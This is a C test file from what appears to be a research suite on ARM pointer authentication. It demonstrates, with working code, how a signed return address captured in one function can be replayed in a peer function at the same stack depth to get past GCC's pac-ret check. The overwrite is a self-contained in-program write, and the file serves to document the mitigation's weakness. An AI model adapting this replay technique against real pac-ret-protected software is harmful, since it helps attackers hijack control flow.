/*
 * t06_sp_collision_pac_reuse/vuln.c -- ADR-2026-05-30-006.
 *
 * Primitive: SP-collision reuse of a signed return address. Vanilla ARM
 *   pointer-authentication-return (`-mbranch-protection=pac-ret`) signs
 *   x30 in the prologue via `paciasp`, which uses the current SP alone
 *   as the modifier. Any function whose epilogue runs at the SAME SP as
 *   some earlier function's prologue can therefore reuse that earlier
 *   function's signed LR and pass `autiasp` -- the modifier matches,
 *   even though the LR was authenticated for an unrelated function.
 *
 *   Reference: Liljestrand, Nyman, Wang, Perez, Ekberg, Asokan,
 *   "PAC it up: Towards Pointer Integrity using ARM Pointer
 *   Authentication", USENIX Security '19, Sections 3 and 7.2.1.
 *   The PARTS scheme (Section 5.3, Listing 2) fixes this by folding a
 *   compile-time function-id into the modifier; vanilla GCC pac-ret
 *   does not.
 *
 * Shape:
 *   `setup_donor()` and `victim()` are peers, both called directly from
 *   main at the same call depth with no intervening locals. Both
 *   declare an identical local layout (`char buf[BUF_LEN]` plus a
 *   `volatile int keep_frame`) so their prologue frame sizes match
 *   and `paciasp`/`autiasp` see the same SP modifier in each.
 *
 *   donor copies the signed LR sitting at its own `[fp, #8]` slot
 *   into the file-scope `captured_lr` global, records its
 *   `__builtin_frame_address(0)` into `donor_sp_at_entry`, and
 *   returns normally (its own `autiasp` succeeds because it was
 *   signed with this same SP).
 *
 *   victim then asserts that its `__builtin_frame_address(0)` equals
 *   `donor_sp_at_entry`. If they differ (compiler upgrade reordered
 *   locals or changed prologue size), victim prints
 *   `UNEXPECTED:t06 sp-mismatch ...` and aborts so the harness flags
 *   the run as ERROR rather than silently misclassifying. If they
 *   match, victim memcpy's `captured_lr` into its own saved-LR slot
 *   at `[fp, #8]` -- this is the "buffer overflow" emitted as a
 *   single in-program write because t06's point is the PAC-collision
 *   claim, not the input vector. On return, `autiasp` authenticates
 *   the substituted LR against the SAME SP modifier `paciasp` used
 *   in donor's prologue, so authentication succeeds and control
 *   transfers to `exploit_success_t06`, which prints "PWNED:t06" and
 *   _exit(0).
 *
 * Expected outcome table (this test):
 *   nopac: stdout contains "PWNED:t06", exit 0
 *   pac:   stdout contains "PWNED:t06", exit 0
 *
 *   This is the UNIQUE test in the suite where the `pac` variant is
 *   expected to be PWNED. t01-t04 demonstrate primitives pac-ret
 *   blocks; t05a/t05b are out-of-scope-for-pac-ret negative controls;
 *   t06 documents a primitive pac-ret was DESIGNED to cover and still
 *   fails on.
 *
 * Toolchain assumptions: aarch64-unknown-linux-gnu-gcc at -O0 -static
 *   -no-pie -fno-stack-protector. The runtime SP-equality assert
 *   catches frame-layout drift on future compiler bumps loudly.
 *
 * Security note: no PAC forgery occurs. The test reads and replays a
 *   value the running process itself signed seconds earlier, exactly
 *   as the paper's threat model describes. No external attacker input;
 *   the "overflow" is a hermetic in-program memcpy.
 */

#include "../common/win.h"

#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma GCC diagnostic ignored "-Wstringop-overflow"
#pragma GCC diagnostic ignored "-Warray-bounds"
#pragma GCC diagnostic ignored "-Wframe-address"

#define BUF_LEN 32

/* Signed LR captured from donor's saved-LR slot. volatile so the
   compiler does not constant-fold the read in victim() or hoist the
   write out of donor(). */
static volatile uint64_t captured_lr = 0;

/* donor's frame-address-at-entry, observed via __builtin_frame_address(0).
   victim compares its own fp against this to assert SP equality. */
static volatile uintptr_t donor_sp_at_entry = 0;

/*
 * Frame-layout discipline: setup_donor() and victim() MUST declare the
 * EXACT same set of locals, in the same order, with the same types, so
 * that GCC -O0 allocates identical prologue frame sizes for both. The
 * runtime SP-equality assert in victim() catches any drift.
 *
 * The two functions diverge only in the BODY (what they do with the LR
 * slot): donor reads captured_lr from [fp,#8] and stores it; victim
 * memcpy's captured_lr INTO buf+lr_off (its own [fp,#8]). All locals
 * are touched/volatile-marked in both so -O0 cannot eliminate them
 * asymmetrically.
 */

__attribute__((noinline))
static void setup_donor(void)
{
    /* Local declarations MUST match victim() exactly -- same names,
       same types, same order, same volatile qualifications. -O0
       allocates one stack slot per local; any drift between donor's
       and victim's local sets shifts their fp values and breaks the
       SP-collision precondition. The victim()-side runtime check
       catches it, but match-by-construction is the primary defense. */
    char buf[BUF_LEN];
    volatile int keep_frame = 0;
    volatile uintptr_t my_fp = 0;
    volatile uintptr_t lr_slot = 0;
    volatile uintptr_t buf_addr = 0;
    volatile ptrdiff_t signed_off = 0;
    volatile ptrdiff_t abs_off = 0;
    volatile size_t lr_off = 0;
    volatile uint64_t replay = 0;

    (void)keep_frame;

    my_fp    = (uintptr_t)__builtin_frame_address(0);
    lr_slot  = my_fp + 8;
    buf_addr = (uintptr_t)buf;
    signed_off = (ptrdiff_t)((intptr_t)lr_slot - (intptr_t)buf_addr);
    abs_off  = signed_off < 0 ? -signed_off : signed_off;
    lr_off   = (size_t)signed_off;
    replay   = 0; /* not used in donor, but kept to match layout */
    (void)signed_off; (void)abs_off; (void)lr_off; (void)replay;

    /* Donor's own saved-LR slot is at [fp, #8] under -O0 (prologue is
       `stp x29, x30, [sp, #-N]!; mov x29, sp`). Read the signed LR
       value out of that slot -- this is the post-paciasp x30 spilled
       by stp. We will replay it inside victim. */
    captured_lr = *(volatile uint64_t *)lr_slot;

    /* Record SP-at-entry proxy. Under -O0 the prologue's
       `mov x29, sp` makes fp equal to SP-after-prologue, a
       deterministic offset below SP-at-entry. Equal fp values
       between two peers called at the same depth with identical
       prologue frame sizes prove their paciasp modifiers matched. */
    donor_sp_at_entry = my_fp;

    /* Force buf and keep_frame to be observable so the compiler
       must really allocate them. */
    asm volatile("" : : "r"(buf), "r"(&keep_frame) : "memory");
}

__attribute__((noinline))
static void victim(void)
{
    /* Local declarations MUST match setup_donor() exactly. Do NOT
       reorder, retype, or omit any of these without making the same
       change in setup_donor(). The SP-equality assert below catches
       silent drift, but match-by-construction is the primary defense. */
    char buf[BUF_LEN];
    volatile int keep_frame = 0;
    volatile uintptr_t my_fp = 0;
    volatile uintptr_t lr_slot = 0;
    volatile uintptr_t buf_addr = 0;
    volatile ptrdiff_t signed_off = 0;
    volatile ptrdiff_t abs_off = 0;
    volatile size_t lr_off = 0;
    volatile uint64_t replay = 0;

    (void)keep_frame;

    my_fp    = (uintptr_t)__builtin_frame_address(0);
    lr_slot  = my_fp + 8;
    buf_addr = (uintptr_t)buf;

    /* SP-equality assert. If donor and victim ended up with different
       fp values, the toolchain has changed frame layout under us and
       the bypass demonstration is invalid -- emit UNEXPECTED so the
       harness flags this as ERROR rather than silently passing or
       failing for an unrelated reason. */
    if (my_fp != donor_sp_at_entry) {
        fprintf(stderr,
                "UNEXPECTED:t06 sp-mismatch donor_fp=%p victim_fp=%p\n",
                (void *)donor_sp_at_entry, (void *)my_fp);
        fflush(stderr);
        abort();
    }

    /* Sanity-check the LR-slot offset relative to buf. Under GCC -O0
       on AArch64, `char buf[BUF_LEN]` is placed at a POSITIVE offset
       from fp and the saved-LR slot lives at [fp, #8] -- so lr_slot
       sits BELOW buf in memory (a negative offset from buf). This is
       the same layout t01 documents in its inner_victim comment.
       Bound the absolute distance to keep the test loudly self-checking
       across toolchain bumps. */
    signed_off = (ptrdiff_t)((intptr_t)lr_slot - (intptr_t)buf_addr);
    abs_off = signed_off < 0 ? -signed_off : signed_off;
    if (signed_off == 0 || abs_off > 512) {
        fprintf(stderr,
                "UNEXPECTED:t06 lr-offset sanity check failed "
                "(buf=%p victim_fp=%p lr_slot=%p signed_off=%td)\n",
                (void *)buf_addr, (void *)my_fp, (void *)lr_slot,
                signed_off);
        fflush(stderr);
        abort();
    }
    lr_off = (size_t)signed_off; /* preserved for layout symmetry */
    (void)lr_off;

    /* The "overflow": write captured_lr (donor's signed LR) into
       victim's saved-LR slot. Emitted as a single in-program memcpy
       because t06's point is the PAC-collision claim, not an input
       vector. This is the moment of substitution. Equivalent to
       `memcpy(buf + signed_off, &replay, 8)` -- written through
       `lr_slot` directly to keep pointer arithmetic in uintptr_t
       space and avoid signed-pointer-offset UB. */
    replay = captured_lr;
    memcpy((void *)lr_slot, (const void *)&replay, sizeof(uint64_t));

    /* Force buf and keep_frame to be observable. */
    asm volatile("" : : "r"(buf), "r"(&keep_frame) : "memory");

    /* Return. On both nopac and pac variants, victim's autiasp sees a
       modifier (SP-at-epilogue) equal to donor's paciasp modifier
       (SP-at-prologue) -- both because the two functions were called
       at the same depth and have identical prologue frame sizes.
       Authentication therefore succeeds even on the pac variant and
       control transfers to exploit_success_t06. */
}

/* Reentry guard for the LR-substitution control flow. File-scope so
   it does NOT add a local to main's frame -- main's SP at the donor
   and victim call sites must be identical, which a stack-allocated
   `once` would break. */
static volatile int once = 0;

int main(void)
{
    /*
     * Control-flow mechanism for the bypass observable
     * (implementation note for ADR-2026-05-30-006):
     *
     * The captured signed LR is donor's saved x30 -- i.e. the value
     * paciasp produced for "return address = instruction after
     * setup_donor() call in main, signed under modifier SP-of-main".
     * When victim's autiasp authenticates that value under the SAME
     * SP modifier (the bypass precondition), it strips the PAC and
     * victim's ret jumps to that very same address: the instruction
     * after the setup_donor() call here.
     *
     * On first entry to main: once == 0; we increment it and call
     * victim(). Victim's substituted LR sends control back to
     * "instruction after setup_donor()" -- i.e. to the test of
     * `once` below. once is now 1, so the if-branch is skipped and
     * control falls through to exploit_success_t06(), emitting
     * PWNED:t06.
     *
     * On nopac: captured_lr is just a raw pointer (no signing); the
     * same control-flow path executes -- PWNED:t06.
     *
     * On pac WITHOUT the SP-collision weakness (hypothetical PARTS
     * scheme or future pac-ret variant): autiasp would compute a
     * different modifier than paciasp did in donor, authentication
     * would fail, and victim's epilogue would trap with SIGSEGV
     * before any control transfer -- no PWNED:t06.
     *
     * The two calls (setup_donor and victim) are textually distinct
     * lines but share main's stack frame: main introduces no locals
     * and no intervening function calls that would alter SP, so SP
     * at donor's prologue equals SP at victim's prologue. `once` is
     * file-scope to keep it out of main's frame; the function calls
     * to setup_donor/victim push and pop their own frames cleanly.
     */
    setup_donor();

    if (once++ == 0) {
        victim();
    }

    exploit_success_t06();

    /* Unreachable: exploit_success_t06 is noreturn. The sentinel
       below would only fire if the function disappeared or returned,
       which the linker prevents. */
    puts("UNEXPECTED:fell through");
    return 1;
}
